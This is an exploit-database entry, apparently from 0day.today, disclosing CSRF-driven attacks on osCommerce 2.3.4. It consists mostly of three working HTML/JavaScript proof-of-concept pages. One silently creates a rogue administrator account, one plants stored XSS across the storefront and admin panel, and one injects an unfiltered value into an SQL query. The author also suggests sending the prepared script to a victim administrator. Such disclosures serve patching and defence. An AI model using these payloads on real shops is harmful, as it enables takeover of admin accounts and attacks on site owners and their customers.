@@ -1,0 +1,104 @@
+id: 23387
+date: 03/13/2015
+title: osCommerce 2.3.4 - SQL Injection & Stored XSS Vulnerabilities
+author: Smash_
+cves: 
+
+#Title: osCommerce 2.3.4 - SQL Injection & Stored XSS
+#Date: 13.03.15
+#Affected versions: => 2.3.4 (latest atm)
+#Vendor: oscommerce.com
+#Tested on: Apache 2.2 / PHP 5.3 @ linux
+#Contact: smash [at] devilteam.pl
+
+
+As disclosed before, you may create new administrators via csrf in current version of osCommerce (http://1337day.com/exploit/22424). Below poc's are also csrf queries, bugs are admin-exploitable; because admin privileges are needed, you would have to send prepared .js to victim to cause csrf request for each vuln, or just create new admin and exploit it with your own account.
+
+---
+
+<html>
+  <!-- Add Admin CSRF-->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/osc-2.3.4/catalog/admin/administrators.php?action=insert", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "username=user&password=pwd";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
+
+---
+
+<html>
+  <body>
+  <!-- Index & Admin Panel Stored XSS -->
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/osc-2.3.4/catalog/admin/configuration.php?gID=1&cID=1&action=save", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "configuration_value=hell\x3cscript\x3ealert('pwned')\x3c/script\x3e";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
+
+Stored XSS affects whole front-end and admin panel.
+
+---
+
+<html>
+  <!-- SQL Injection -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/osc-2.3.4/catalog/admin/configuration.php?gID=3&cID=47&action=save", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "configuration_value=injection";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
+
+Above request will result in sql error that will appear on index, value of POST parameter is not being filtered. 
+
+(...)
+1327 - Undeclared variable: injection
+
+select p.products_id, pd.products_name, p.products_price, p.products_tax_class_id, p.products_image, s.specials_new_products_price from products p, products_description pd, specials s where p.products_status = '1' and p.products_id = s.products_id and pd.products_id = s.products_id and pd.language_id = '1' and s.status = '1' order by s.specials_date_added desc limit injection
+
+[TEP STOP]
+(...)
+
+#  0day.today [2023-03-23]  #
